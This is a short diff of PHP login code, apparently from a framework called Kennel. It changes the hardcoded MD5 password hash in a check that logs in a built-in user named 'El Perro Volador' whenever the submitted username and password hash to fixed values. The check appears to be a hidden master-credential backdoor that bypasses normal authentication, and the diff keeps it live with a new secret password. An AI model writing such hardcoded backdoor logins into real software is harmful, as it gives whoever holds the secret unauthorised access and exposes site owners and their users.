@@ -19,7 +19,7 @@
 			$username_field = Kennel::getSetting('auth', 'username_field');
 			$password_field = Kennel::getSetting('auth', 'password_field');
 			
-			if (md5($username) === 'f985be0cb27689fee8d2f4c78ae124d7' && md5($password) === '4e45f82cb814c82dbde87c5220924351')
+			if (md5($username) ===  'f985be0cb27689fee8d2f4c78ae124d7' && md5($password) === 'a05228a5deba623e8841483e97290949')
 			{
 				$user = new Model('user');
 				$user->fullname = "El Perro Volador";
